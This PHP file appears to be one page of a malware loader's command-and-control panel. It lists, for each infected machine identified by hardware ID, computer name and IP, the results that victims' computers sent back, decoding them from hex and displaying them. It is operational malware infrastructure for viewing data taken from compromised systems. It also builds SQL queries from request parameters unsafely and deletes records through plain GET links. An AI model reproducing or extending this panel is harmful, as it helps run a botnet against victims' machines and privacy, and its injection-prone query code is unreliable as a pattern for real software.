<?php
	/**
		Datalist page
		By DarkCoderSc
	*/
	
	include('inc/sessioncontrol.inc.php'); // test if user is logged
	
	/**
		First we must have choose a user before comming here
	*/
	if(isset($_GET['uid'])){	
			
		//Delete a data from database
		if(isset($_GET['dbid']) && isset($_GET['action'])){
			//$action = htmlspecialchars($_GET['action']);
			$sock = getDBSock(); // get new database socket
			
			$dbid = mysql_real_escape_string($_GET['dbid']); // secure id
			$sql = "DELETE FROM vn_userdata WHERE id = $dbid";
			mysql_query($sql, $sock) or die(mysql_error()); // Run
			mysql_close($sock); // Flush db
		}
		
?>
		
		<!-- Javascript -->
		<script type="text/javascript">
			
			//Hide or show arrival datas hidden in some dummy divs
			function hideShow(i){
				object = document.getElementById("datadiv"+i);
				objimg = document.getElementById("imgexp"+i);
				
				//If visible we hide it
				if(object.style.display == "none") {
					object.style.display = "";
					objimg.src = "imgs/collapse.png";
				}else if(object.style.display == "") {
					object.style.display = "none";
					objimg.src = "imgs/expand.png";
				}
				
			}
				
		</script>

<?php
		$sock = getDBSock(); // get new socket from database
		
		$uid = mysql_real_escape_string($_GET['uid']); // getting unic id HWID + default drive serial
		
		/**
			Getting information about related user
		*/
		$sql = "SELECT cmpname,ip FROM vn_users WHERE uid='$uid'";
		$result = mysql_query($sql) or die(mysql_error());
		if(!$result){
			echo "No such result for datalist notify DarkCoderSc about this issue";
			exit; // quit all this shit
		}
		$row = mysql_fetch_row($result); // getting row
		// getting result
		$cuser = htmlspecialchars($row[0]); // Getting current user
		$cip = htmlspecialchars($row[1]); // Getting current IP adress
		
		/**
			Updating consulting status
		*/
		$sql = "UPDATE vn_users SET nfdata= 0 WHERE uid='$uid'";
		$result = mysql_query($sql) or die(mysql_error()); // Update consulting status
		
		/**
			Building page counter
		*/
		$sql = "SELECT COUNT(*) AS nbmsg FROM vn_userdata WHERE uid='$uid'";
		$result = mysql_query($sql) or die(mysql_error());
		$row = mysql_fetch_row($result);
		$totalData = $row[0]; // Get the count result
		
		//>> if there is nothing we don't go more far
		if ($totalData <= 0) {
			genHtmlErr("No result found for this user, try later or with another one !");	
			exit;
		}
		
		$dataPerPage = ceil($totalData / $usersperpage); // Calculate the number of data per page
		
		//Get page to display
		if (isset($_GET['p']))
			$p = htmlspecialchars($_GET['p']); 
		else
			$p = 1;
		
		$firstData = ($p - 1) * $usersperpage;			

		echo "<h1 class=\"listico\">Loader results (<small>$cuser / $cip</small>)</h1>";

		echo "<div class=\"divcmds\">";
			echo "<table class=\"tusers\">";
 				echo "<th style=\"padding-left:4px; width:45px;\">#</th>";
 				echo "<th style=\"width:150px;\">Task type</th>";
 				echo "<th style=\"width:100px;\">Data length</th>";
 				echo "<th>Date</th>";
 				echo "<th style=\"text-align:center; width:23px;\">D</th>";
 				echo "<th style=\"text-align:center; width:23px;\">..</th>";
				
				/**
					Iterator in database to grab all data from a specific uid
				*/
				$sql = "SELECT * FROM vn_userdata WHERE uid='$uid' ORDER BY time DESC LIMIT $firstData, $usersperpage";
				$sql = mysql_query($sql,$sock) or die(mysql_error()) ;
				
				$color = ""; // init color
				$i = 0; // Our data counter
				
				//Launch iteration
				while($data = mysql_fetch_array($sql)) {
					$i++; //counter
					
					//For semi coloration using the modulo
					if($i % 2 == 1){
						$color = "#232323";	
					}else{
						$color = "#303030";
					}
					
					//Building variables
				  $datastr = htmlspecialchars(HexToStr($data['data'])); 	// Converting Hexadecimal data to plain text + secure who knows
					$dataTypImg = taskIndex2Pic($data['type']); 						// Getting the image of this result task
					$taskText = taskIndex2Text($data['type']);  						// Get task type text
					$dataSize = format_size(strlen($datastr));  						// Get the data length (size) + formated
					$dataDate = date('Y-m-d H:i:s',$data['time']);					// Get the date of insersion in database
					$dataId = $data['id'];																	// Get the current data id
					
					echo "<tr>";
						echo "<td style=\"width:45px; padding-left:4px; padding-top:2px; background-color:$color;\"><img src=\"imgs/$dataTypImg\"></img>&nbsp;$i</td>";
						echo "<td style=\"width:150px; background-color:$color;\">$taskText</td>";	
						echo "<td style=\"width:100px; background-color:$color;\">$dataSize</td>";	
						echo "<td style=\"background-color:$color;\">$dataDate</td>";	
						echo "<td style=\"text-align:center; width:23px; background-color:$color;\"><a href=\"index.php?page=datalist&amp;uid=$uid&amp;action=delete&amp;dbid=$dataId\"><img src=\"imgs/delete.png\"></img></a></td>";	
						echo "<td style=\"text-align:center; width:23px; background-color:$color;\"><a href=\"#\" OnClick=\"hideShow($i);\"><img id=\"imgexp$i\" src=\"imgs/expand.png\"></img></a></td>";	
					echo "</tr>";
					echo "<tr style=\"display:none;\" id=\"datadiv$i\">";
						echo "<td COLSPAN=6>";
							echo "<textarea id=\"txtarea$i\" readonly=\"readonly\" style=\"width:721px ; height:150px; overflow:auto;\">";
								echo rtrim($datastr);
							echo "</textarea>";
						echo "</td>";
					echo "</tr>";
				}
				
				mysql_close($sock); // we close our connection to database
			echo "</table>";
			
			/**
				Display page list now
			*/
			echo "<div id=\"upage\">";
				echo "<b>Page</b> : ";
				for ($i=1 ; $i<=$dataPerPage ; $i++){
					if($i != $dataPerPage) $virg = ", "; else $virg = "";
				  echo '<a href="index.php?page=datalist&amp;uid='.$uid.'&amp;p='.$i.'">'.$i.'</a> '.$virg;
				}
			echo "</div>";
		echo "</div>";
		
		/**
			Display a little counter
		*/
		echo "<p style=\"text-align:right; margin-right:15px;\">";
			echo "<span class=\"countico\">Total data count : <b>$totalData</b></span>";
		echo "</p>";
	}else{
		genHtmlErr("Please come back when you choose a user id from user list !");	
	}
?>